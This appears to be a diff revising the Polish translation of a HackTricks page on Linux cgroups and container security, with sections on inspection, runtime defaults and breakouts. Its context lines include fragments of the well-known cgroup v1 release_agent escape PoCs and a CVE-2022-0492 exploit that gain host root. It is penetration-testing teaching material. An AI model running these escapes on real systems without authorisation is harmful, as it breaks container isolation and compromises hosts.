@@ -2,40 +2,40 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Przegląd
+## Overview
 
-Linux **control groups** to mechanizm jądra używany do grupowania procesów na potrzeby rozliczania, ograniczania, ustalania priorytetów i egzekwowania zasad. Jeśli namespaces dotyczą głównie izolowania sposobu postrzegania zasobów, to cgroups służą przede wszystkim do kontrolowania **ile** tych zasobów może zużywać dany zestaw procesów oraz, w niektórych przypadkach, **z jakimi klasami zasobów** może on w ogóle wchodzić w interakcję. Containers nieustannie korzystają z cgroups, nawet gdy użytkownik nigdy nie zagląda do nich bezpośrednio, ponieważ niemal każdy współczesny runtime potrzebuje sposobu, aby poinformować jądro: „te procesy należą do tego workloadu, a te zasady dotyczące zasobów mają do nich zastosowanie”.
+Linuxowe **grupy kontrolne** to mechanizm jądra używany do grupowania procesów na potrzeby rozliczania, ograniczania, ustalania priorytetów i egzekwowania zasad. Jeśli namespaces dotyczą głównie izolowania widoku zasobów, cgroups dotyczą przede wszystkim kontrolowania **ilości** zasobów, jakie może zużywać dany zestaw procesów, a w niektórych przypadkach także **klas zasobów**, z którymi mogą one w ogóle wchodzić w interakcję. Containers stale korzystają z cgroups, nawet gdy użytkownik nigdy nie zagląda do nich bezpośrednio, ponieważ niemal każdy nowoczesny runtime potrzebuje sposobu, aby przekazać jądru: „te procesy należą do tego workloadu, a te reguły zasobów mają do nich zastosowanie”.
 
-Dlatego container engines umieszczają nowy container w jego własnym poddrzewie cgroup. Gdy drzewo procesów się tam znajduje, runtime może ograniczyć pamięć, zmniejszyć maksymalną liczbę PID-ów, ustalić wagę użycia CPU, regulować operacje I/O i ograniczyć dostęp do urządzeń. W środowisku produkcyjnym ma to kluczowe znaczenie zarówno dla bezpieczeństwa wielu tenantów, jak i dla zwykłej higieny operacyjnej. Container pozbawiony sensownych mechanizmów kontroli zasobów może wyczerpać pamięć, zalać system procesami albo zmonopolizować CPU i I/O w sposób destabilizujący hosta lub sąsiednie workloady.
+Dlatego container engines umieszczają nowy container w osobnym poddrzewie cgroup. Gdy drzewo procesów znajduje się już w tym miejscu, runtime może ograniczać pamięć, limitować liczbę PID-ów, ustalać wagę użycia CPU, regulować operacje I/O i ograniczać dostęp do urządzeń. W środowisku produkcyjnym jest to niezbędne zarówno dla bezpieczeństwa multi-tenant, jak i dla zwykłej higieny operacyjnej. Container bez odpowiednich kontroli zasobów może wyczerpać pamięć, zalać system procesami albo zmonopolizować CPU i I/O w sposób destabilizujący hosta lub sąsiednie workloady.
 
-Z perspektywy bezpieczeństwa cgroups mają znaczenie z dwóch odrębnych powodów. Po pierwsze, niewłaściwe lub brakujące limity zasobów umożliwiają proste ataki denial-of-service. Po drugie, niektóre funkcje cgroups, szczególnie w starszych konfiguracjach **cgroup v1**, historycznie tworzyły potężne primitives umożliwiające breakout, gdy można było je zapisywać z wnętrza containera.
+Z perspektywy bezpieczeństwa cgroups mają znaczenie z dwóch odrębnych powodów. Po pierwsze, nieprawidłowe lub brakujące limity zasobów umożliwiają proste ataki denial-of-service. Po drugie, niektóre funkcje cgroups, zwłaszcza w starszych konfiguracjach **cgroup v1**, historycznie tworzyły potężne primitive breakout, gdy można było je zapisywać z wnętrza containera.
 
-## v1 a v2
+## v1 Vs v2
 
-W użyciu znajdują się dwa główne modele cgroup. **cgroup v1** udostępnia wiele hierarchii kontrolerów, a starsze opisy exploitów często koncentrują się na dostępnych tam nietypowych i czasami nadmiernie potężnych mechanizmach. **cgroup v2** wprowadza bardziej ujednoliconą hierarchię i ogólnie bardziej przejrzyste działanie. Nowoczesne dystrybucje coraz częściej preferują cgroup v2, ale nadal istnieją środowiska mieszane lub starsze, co oznacza, że podczas analizy rzeczywistych systemów oba modele pozostają istotne.
+W użyciu znajdują się dwa główne modele cgroup. **cgroup v1** udostępnia wiele hierarchii kontrolerów, a starsze opisy exploitów często koncentrują się na dostępnej tam dziwnej i czasami nadmiernie rozbudowanej semantyce. **cgroup v2** wprowadza bardziej ujednoliconą hierarchię i ogólnie bardziej przejrzyste zachowanie. Nowoczesne dystrybucje coraz częściej preferują cgroup v2, ale nadal istnieją środowiska mieszane lub legacy, co oznacza, że oba modele pozostają istotne podczas analizowania rzeczywistych systemów.
 
-Różnica ma znaczenie, ponieważ niektóre z najsłynniejszych historii dotyczących container breakout, takie jak nadużycia **`release_agent`** w cgroup v1, są bardzo konkretnie związane ze starszym działaniem cgroup. Czytelnik, który znajdzie exploit cgroup na blogu, a następnie bezrefleksyjnie zastosuje go w nowoczesnym systemie obsługującym wyłącznie cgroup v2, prawdopodobnie błędnie oceni, co jest faktycznie możliwe na celu.
+Różnica ma znaczenie, ponieważ niektóre z najbardziej znanych historii dotyczących container breakout, takie jak nadużycia **`release_agent`** w cgroup v1, są bardzo ściśle związane ze starszym zachowaniem cgroup. Czytelnik, który zobaczy exploit cgroup na blogu, a następnie bezrefleksyjnie zastosuje go do nowoczesnego systemu używającego wyłącznie cgroup v2, prawdopodobnie błędnie zrozumie, co faktycznie jest możliwe na celu.
 
-## Inspekcja
+## Inspection
 
 Najszybszym sposobem sprawdzenia, gdzie znajduje się bieżąca powłoka, jest:
 ```bash
 cat /proc/self/cgroup
 findmnt -T /sys/fs/cgroup
 ```
-Plik `/proc/self/cgroup` pokazuje ścieżki cgroup powiązane z bieżącym procesem. Na nowoczesnym hoście z cgroup v2 często widoczny będzie ujednolicony wpis. Na starszych lub hybrydowych hostach może być widocznych wiele ścieżek kontrolerów v1. Gdy znasz już ścieżkę, możesz sprawdzić odpowiadające jej pliki w `/sys/fs/cgroup`, aby zobaczyć limity i bieżące użycie.
+Plik `/proc/self/cgroup` pokazuje ścieżki cgroup powiązane z bieżącym procesem. Na nowoczesnym hoście cgroup v2 często zobaczysz wpis unified. Na starszych lub hybrydowych hostach możesz zobaczyć wiele ścieżek kontrolerów v1. Gdy znasz ścieżkę, możesz sprawdzić odpowiadające jej pliki w `/sys/fs/cgroup`, aby zobaczyć limity i bieżące użycie.
 
-Na hoście z cgroup v2 przydatne są następujące polecenia:
+Na hoście cgroup v2 przydatne są następujące polecenia:
 ```bash
 ls -l /sys/fs/cgroup
 cat /sys/fs/cgroup/cgroup.controllers
 cat /sys/fs/cgroup/cgroup.subtree_control
 ```
-Pliki te ujawniają, które kontrolery istnieją i które z nich są delegowane do podrzędnych cgroups. Ten model delegowania ma znaczenie w środowiskach rootless i zarządzanych przez systemd, gdzie runtime może mieć możliwość kontrolowania jedynie tego podzbioru funkcji cgroups, który nadrzędna hierarchia faktycznie deleguje.
+Pliki te ujawniają, które kontrolery istnieją oraz które z nich są delegowane do podrzędnych cgroups. Ten model delegowania ma znaczenie w środowiskach rootless i zarządzanych przez systemd, gdzie runtime może mieć możliwość kontrolowania jedynie podzbioru funkcji cgroups, który faktycznie deleguje nadrzędna hierarchia.
 
 ## Laboratorium
 
-Jednym ze sposobów obserwowania cgroups w praktyce jest uruchomienie kontenera z ograniczeniem pamięci:
+Jednym ze sposobów obserwowania cgroups w praktyce jest uruchomienie kontenera z limitem pamięci:
 ```bash
 docker run --rm -it --memory=256m debian:stable-slim bash
 cat /proc/self/cgroup
@@ -46,35 +46,35 @@ Możesz również wypróbować kontener z ograniczeniem PID:
 docker run --rm -it --pids-limit=64 debian:stable-slim bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
 ```
-Te przykłady są przydatne, ponieważ pomagają połączyć flagę runtime z interfejsem plików kernela. Runtime nie wymusza reguły za pomocą magii; zapisuje odpowiednie ustawienia cgroup, a następnie pozwala kernelowi egzekwować je wobec drzewa procesów.
+Te przykłady są przydatne, ponieważ pomagają połączyć flagę runtime z interfejsem plików kernela. Runtime nie egzekwuje reguły za pomocą magii; zapisuje odpowiednie ustawienia cgroup, a następnie pozwala kernelowi egzekwować je względem drzewa procesów.
 
 ## Użycie runtime
 
-Docker, Podman, containerd i CRI-O korzystają z cgroups jako części normalnego działania. Różnice zwykle nie dotyczą tego, czy używają cgroups, lecz **które wartości domyślne wybierają**, **jak współdziałają z systemd**, **jak działa delegowanie rootless** oraz **jaka część konfiguracji jest kontrolowana na poziomie engine, a jaka na poziomie orkiestracji**.
+Docker, Podman, containerd i CRI-O korzystają z cgroups w ramach standardowego działania. Różnice zwykle nie dotyczą tego, czy używają cgroups, lecz **które wartości domyślne wybierają**, **jak współdziałają z systemd**, **jak działa delegowanie w trybie rootless** oraz **jaka część konfiguracji jest kontrolowana na poziomie engine, a jaka na poziomie orkiestracji**.
 
-W Kubernetes żądania zasobów i limity ostatecznie stają się konfiguracją cgroup na node. Ścieżka od YAML-a poda do egzekwowania przez kernel prowadzi przez kubelet, runtime CRI i runtime OCI, ale cgroups nadal są mechanizmem kernela, który ostatecznie stosuje regułę. W środowiskach Incus/LXC cgroups również są intensywnie wykorzystywane, szczególnie dlatego, że system containers często udostępniają bogatsze drzewo procesów i oczekiwania operacyjne bardziej zbliżone do VM.
+W Kubernetes żądania zasobów i limity ostatecznie stają się konfiguracją cgroup na węźle. Droga od YAML-a Poda do egzekwowania przez kernel prowadzi przez kubelet, runtime CRI i runtime OCI, ale cgroups nadal są mechanizmem kernela, który ostatecznie stosuje regułę. W środowiskach Incus/LXC cgroups również są intensywnie wykorzystywane, szczególnie dlatego, że kontenery systemowe często udostępniają bogatsze drzewo procesów i bardziej zbliżone do VM oczekiwania operacyjne.
 
 ## Błędne konfiguracje i breakouts
 
-Klasyczna historia bezpieczeństwa cgroup dotyczy mechanizmu zapisywalnego **cgroup v1 `release_agent`**. W tym modelu, jeśli attacker mógł zapisywać do odpowiednich plików cgroup, włączyć `notify_on_release` i kontrolować ścieżkę przechowywaną w `release_agent`, kernel mógł ostatecznie wykonać wybraną przez attackera ścieżkę w początkowych namespaces na hoście, gdy cgroup stał się pusty. Dlatego starsze opracowania poświęcają tak dużo uwagi zapisywalności kontrolerów cgroup, opcjom montowania oraz warunkom związanym z namespaces/capabilities.
+Klasyczna historia bezpieczeństwa cgroups dotyczy mechanizmu **cgroup v1 `release_agent`**, który umożliwia zapis. W tym modelu, jeśli attacker może zapisywać do właściwych plików cgroup, włączyć `notify_on_release` i kontrolować ścieżkę przechowywaną w `release_agent`, kernel może ostatecznie wykonać wybraną przez attackera ścieżkę w initial namespaces na hoście, gdy cgroup stanie się pusta. Dlatego starsze opracowania poświęcają tak wiele uwagi możliwości zapisu do kontrolerów cgroup, opcjom montowania oraz warunkom dotyczącym namespaces/capabilities.
 
-Nawet gdy `release_agent` jest niedostępny, błędy w konfiguracji cgroup nadal mają znaczenie. Nadmiernie szeroki dostęp do urządzeń może sprawić, że urządzenia hosta będą osiągalne z kontenera. Brak limitów pamięci i PID może przekształcić zwykłe code execution w DoS hosta. Słabe delegowanie cgroup w scenariuszach rootless może również wprowadzać defenderów w błąd, skłaniając ich do założenia, że ograniczenie istnieje, mimo że runtime nigdy nie był faktycznie w stanie go zastosować.
+Nawet gdy `release_agent` nie jest dostępny, błędy w cgroups nadal mają znaczenie. Nadmiernie szeroki dostęp do urządzeń może sprawić, że urządzenia hosta będą osiągalne z kontenera. Brak limitów pamięci i PID może zamienić proste code execution w DoS hosta. Słabe delegowanie cgroup w scenariuszach rootless może również wprowadzić defenderów w błąd i sprawić, że założą istnienie ograniczenia, którego runtime nigdy faktycznie nie był w stanie zastosować.
 
-### Tło `release_agent`
+### `release_agent` — informacje podstawowe
 
-Technika `release_agent` dotyczy wyłącznie **cgroup v1**. Podstawowa idea polega na tym, że gdy ostatni proces w cgroup zakończy działanie, a `notify_on_release=1` jest ustawione, kernel wykonuje program, którego ścieżka jest przechowywana w `release_agent`. To wykonanie następuje w **początkowych namespaces na hoście**, co sprawia, że zapisywalny `release_agent` staje się prymitywem container escape.
+Technika `release_agent` dotyczy wyłącznie **cgroup v1**. Podstawowy pomysł polega na tym, że gdy ostatni proces w cgroup zakończy działanie i ustawione jest `notify_on_release=1`, kernel wykonuje program, którego ścieżka jest przechowywana w `release_agent`. To wykonanie odbywa się w **initial namespaces na hoście**, co zmienia zapisywalny `release_agent` w primitive umożliwiający container escape.
 
 Aby technika zadziałała, attacker zazwyczaj potrzebuje:
 
-- zapisywalnej hierarchii **cgroup v1**
+- hierarchii **cgroup v1** z możliwością zapisu
 - możliwości utworzenia lub użycia child cgroup
 - możliwości ustawienia `notify_on_release`
-- możliwości zapisania ścieżki do `release_agent`
-- ścieżki, która z perspektywy hosta wskazuje na plik wykonywalny
+- możliwości zapisania ścieżki w `release_agent`
+- ścieżki, która z punktu widzenia hosta wskazuje na plik wykonywalny
 
-### Klasyczny PoC
+### Klasyczne PoC
 
-Historyczny one-liner PoC to:
+Historyczny PoC w postaci one-linera to:<sup>[[1]](#references)</sup>
 ```bash
 d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
 mkdir -p "$d/w"
@@ -91,13 +91,13 @@ sh -c "echo 0 > $d/w/cgroup.procs"
 sleep 1
 cat /o
 ```
-Ten PoC zapisuje ścieżkę payloadu do `release_agent`, wyzwala zwolnienie cgroup, a następnie odczytuje plik wyjściowy wygenerowany na hoście.
+Ten PoC zapisuje ścieżkę payloadu w `release_agent`, wyzwala zwolnienie cgroup, a następnie odczytuje plik wyjściowy wygenerowany na hoście.
 
-### Czytelne omówienie
+### Przejrzyste omówienie
 
-Ta sama idea jest łatwiejsza do zrozumienia po podzieleniu jej na kroki.
+Tę samą ideę łatwiej zrozumieć po rozbiciu jej na kroki.<sup>[[1]](#references)</sup>
 
-1. Utwórz i przygotuj zapisywalną cgroup:
+1. Utwórz i przygotuj zapisywalny cgroup:
 ```bash
 mkdir /tmp/cgrp
 mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
@@ -109,7 +109,7 @@ echo 1 > /tmp/cgrp/x/notify_on_release
 host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-3. Umieść payload, który będzie widoczny ze ścieżki hosta:
+3. Upuść payload, który będzie widoczny ze ścieżki hosta:
 ```bash
 cat <<'EOF' > /cmd
 #!/bin/sh
@@ -123,11 +123,11 @@ sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
 sleep 1
 cat /output
 ```
-Efektem jest wykonanie payloadu po stronie hosta z uprawnieniami host root. W realnym exploicie payload zwykle zapisuje proof file, uruchamia reverse shell lub modyfikuje stan hosta.
+Efektem jest wykonanie payloadu po stronie hosta z uprawnieniami root hosta. W prawdziwym exploicie payload zwykle zapisuje plik potwierdzający, uruchamia reverse shell lub modyfikuje stan hosta.
 
-### Wariant ze ścieżką względną przy użyciu `/proc/<pid>/root`
+### Wariant ścieżki względnej wykorzystujący `/proc/<pid>/root`
 
-W niektórych środowiskach ścieżka hosta do filesystemu kontenera nie jest oczywista lub jest ukryta przez storage driver. W takim przypadku ścieżkę payloadu można wyrazić za pomocą `/proc/<pid>/root/...`, gdzie `<pid>` to host PID należący do procesu w bieżącym kontenerze. Na tym opiera się wariant brute-force ze ścieżką względną:
+W niektórych środowiskach ścieżka hosta do systemu plików kontenera nie jest oczywista lub jest ukryta przez storage driver. W takim przypadku ścieżkę payloadu można wyrazić za pomocą `/proc/<pid>/root/...`, gdzie `<pid>` jest PID-em hosta należącym do procesu w bieżącym kontenerze. Na tym opiera się wariant brute-force oparty na ścieżce względnej:<sup>[[2]](#references)</sup>
 ```bash
 #!/bin/sh
 
@@ -175,11 +175,11 @@ done
 sleep 1
 cat ${OUTPUT_PATH}
 ```
-Istotny trick nie polega tutaj na samym brute force, lecz na formie ścieżki: `/proc/<pid>/root/...` pozwala kernelowi rozwiązać plik wewnątrz filesystemu kontenera z poziomu host namespace, nawet gdy bezpośrednia ścieżka storage hosta nie jest wcześniej znana.
+Istotnym trikiem nie jest tutaj samo brute force, lecz forma ścieżki: `/proc/<pid>/root/...` pozwala kernelowi rozwiązać plik znajdujący się wewnątrz filesystemu kontenera z przestrzeni nazw hosta, nawet gdy bezpośrednia ścieżka storage hosta nie jest wcześniej znana.
 
-### CVE-2022-0492 Variant
+### Wariant CVE-2022-0492
 
-W 2022 roku CVE-2022-0492 wykazało, że zapis do `release_agent` w cgroup v1 nie sprawdzał poprawnie `CAP_SYS_ADMIN` w **initial user namespace**. Dzięki temu technika była znacznie łatwiej dostępna na podatnych kernelach, ponieważ proces kontenera, który mógł zamontować hierarchię cgroup, mógł zapisać do `release_agent` bez wcześniejszego uzyskania uprawnień w host user namespace.
+W 2022 roku CVE-2022-0492 wykazało, że zapis do `release_agent` w cgroup v1 nie sprawdzał poprawnie `CAP_SYS_ADMIN` w **początkowej** przestrzeni nazw użytkowników. Dzięki temu technika była znacznie łatwiej dostępna na podatnych kernelach, ponieważ proces kontenera, który mógł zamontować hierarchię cgroup, mógł zapisać do `release_agent` bez wcześniejszego uzyskania uprawnień w przestrzeni nazw użytkowników hosta.<sup>[[3]](#references)</sup>
 
 Minimalny exploit:
 ```bash
@@ -193,31 +193,31 @@ echo /proc/self/exe > /tmp/c/release_agent
 while true; do sleep 1; done
 '
 ```
-Na podatnym kernelu host wykonuje `/proc/self/exe` z uprawnieniami root na hoście.
+Na podatnym jądrze host wykonuje `/proc/self/exe` z uprawnieniami root na hoście.
 
-W praktyce nadużycie zacznij od sprawdzenia, czy środowisko nadal udostępnia zapisywalne ścieżki cgroup-v1 lub niebezpieczny dostęp do urządzeń:
+W praktyce wykorzystania zacznij od sprawdzenia, czy środowisko nadal udostępnia zapisywalne ścieżki cgroup-v1 lub niebezpieczny dostęp do urządzeń:
 ```bash
 mount | grep cgroup
 find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
 find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
 ls -l /dev | head -n 50
 ```
-Jeśli `release_agent` jest obecny i można go zapisywać, znajdujesz się już na obszarze legacy-breakout:
+Jeśli `release_agent` jest obecny i można go zapisywać, masz już do czynienia z legacy breakout:
 ```bash
 find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
 find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
 ```
-Jeśli sama ścieżka cgroup nie prowadzi do escape, kolejnym praktycznym zastosowaniem jest często denial of service lub reconnaissance:
+Jeśli sama ścieżka cgroup nie prowadzi do ucieczki, kolejnym praktycznym zastosowaniem jest często odmowa usługi lub rozpoznanie:
 ```bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
 cat /sys/fs/cgroup/memory.max 2>/dev/null
 cat /sys/fs/cgroup/cpu.max 2>/dev/null
 ```
-Te polecenia szybko pokażą, czy workload ma możliwość uruchomienia fork-bomb, agresywnego zużywania pamięci lub nadużycia zapisywalnego interfejsu legacy cgroup.
+Te polecenia szybko pokazują, czy workload ma możliwość uruchomienia fork-bomb, agresywnego zużywania pamięci lub nadużycia zapisywalnego, starszego interfejsu cgroup.
 
-## Sprawdzenia
+## Checks
 
-Podczas przeglądu celu celem sprawdzeń cgroup jest ustalenie, który model cgroup jest używany, czy kontener widzi zapisywalne ścieżki kontrolerów oraz czy stare mechanizmy breakout, takie jak `release_agent`, są w ogóle istotne.
+Podczas przeglądania celu zadaniem checks dotyczących cgroup jest ustalenie, który model cgroup jest używany, czy kontener widzi zapisywalne ścieżki kontrolerów oraz czy stare primitives breakout, takie jak `release_agent`, są w ogóle istotne.
 ```bash
 cat /proc/self/cgroup                                      # Current process cgroup placement
 mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
@@ -227,19 +227,26 @@ cat /proc/1/cgroup                                         # Compare with PID 1 
 Co jest tutaj interesujące:
 
 - Jeśli `mount | grep cgroup` pokazuje **cgroup v1**, starsze writeupy dotyczące breakout stają się bardziej istotne.
-- Jeśli istnieje `release_agent` i można uzyskać do niego dostęp, warto od razu przeprowadzić dokładniejsze badanie.
-- Jeśli widoczna hierarchia cgroup jest zapisywalna, a kontener ma również silne capabilities, środowisko zasługuje na znacznie dokładniejszy przegląd.
+- Jeśli `release_agent` istnieje i jest osiągalny, natychmiast warto przeprowadzić dokładniejsze sprawdzenie.
+- Jeśli widoczna hierarchia cgroup jest zapisywalna, a kontener ma również silne capabilities, środowisko wymaga znacznie dokładniejszej analizy.
 
-Jeśli wykryjesz **cgroup v1**, zapisywalne mounty kontrolerów oraz kontener, który ma również silne capabilities lub słabą ochronę seccomp/AppArmor, taka kombinacja wymaga szczególnej uwagi. cgroups często traktuje się jako nudny temat związany z zarządzaniem zasobami, ale historycznie były one częścią niektórych z najbardziej pouczających łańcuchów container escape — właśnie dlatego, że granica między „kontrolą zasobów” a „wpływem na hosta” nie zawsze była tak wyraźna, jak zakładano.
+Jeśli odkryjesz **cgroup v1**, zapisywalne mounty kontrolerów oraz kontener, który ma również silne capabilities albo słabą ochronę seccomp/AppArmor, taka kombinacja wymaga szczególnej uwagi. cgroups są często traktowane jako mało interesujący temat związany z zarządzaniem zasobami, ale historycznie były częścią jednych z najbardziej pouczających łańcuchów container escape, właśnie dlatego, że granica między „kontrolą zasobów” a „wpływem na hosta” nie zawsze była tak wyraźna, jak zakładano.
 
 ## Domyślne ustawienia runtime
 
-| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienie |
+| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabienie |
 | --- | --- | --- | --- |
-| Docker Engine | Domyślnie włączone | Kontenery są automatycznie umieszczane w cgroups; limity zasobów są opcjonalne, chyba że zostaną ustawione za pomocą flag | pominięcie `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
-| Podman | Domyślnie włączone | `--cgroups=enabled` jest ustawieniem domyślnym; domyślne ustawienia przestrzeni nazw cgroup różnią się w zależności od wersji cgroup (`private` w cgroup v2, `host` w niektórych konfiguracjach cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, złagodzony dostęp do urządzeń, `--privileged` |
-| Kubernetes | Domyślnie włączone przez runtime | Pody i kontenery są umieszczane w cgroups przez runtime węzła; szczegółowa kontrola zasobów zależy od `resources.requests` / `resources.limits` | pominięcie requestów/limitów zasobów, uprzywilejowany dostęp do urządzeń, błędna konfiguracja runtime na poziomie hosta |
-| containerd / CRI-O | Domyślnie włączone | cgroups są częścią standardowego zarządzania cyklem życia | bezpośrednie konfiguracje runtime łagodzące kontrolę urządzeń lub udostępniające starsze zapisywalne interfejsy cgroup v1 |
+| Docker Engine | Włączone domyślnie | Kontenery są automatycznie umieszczane w cgroups; limity zasobów są opcjonalne, chyba że zostaną ustawione za pomocą flag | pominięcie `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
+| Podman | Włączone domyślnie | `--cgroups=enabled` jest ustawieniem domyślnym; ustawienia namespace cgroup różnią się w zależności od wersji cgroup (`private` w cgroup v2, `host` w niektórych konfiguracjach cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, poluzowany dostęp do urządzeń, `--privileged` |
+| Kubernetes | Domyślnie włączone przez runtime | Pody i kontenery są umieszczane w cgroups przez runtime noda; szczegółowa kontrola zasobów zależy od `resources.requests` / `resources.limits` | pominięcie requestów/limitów zasobów, uprzywilejowany dostęp do urządzeń, błędna konfiguracja runtime na poziomie hosta |
+| containerd / CRI-O | Włączone domyślnie | cgroups są częścią standardowego zarządzania cyklem życia | bezpośrednie konfiguracje runtime, które osłabiają kontrolę urządzeń lub udostępniają starsze zapisywalne interfejsy cgroup v1 |
 
-Ważne rozróżnienie polega na tym, że **istnienie cgroup** jest zwykle domyślne, natomiast **użyteczne ograniczenia zasobów** często są opcjonalne, chyba że zostaną jawnie skonfigurowane.
+Istotne rozróżnienie polega na tym, że **istnienie cgroup** jest zazwyczaj domyślne, natomiast **użyteczne ograniczenia zasobów** są często opcjonalne, chyba że zostaną jawnie skonfigurowane.
+
+## Odnośniki
+
+- [1] [Zrozumienie container escape w Dockerze](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
+- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
+- [3] [Nowa podatność Linuksa CVE-2022-0492 dotycząca cgroups: czy kontenery mogą wykonać escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
+
 {{#include ../../../../banners/hacktricks-training.md}}
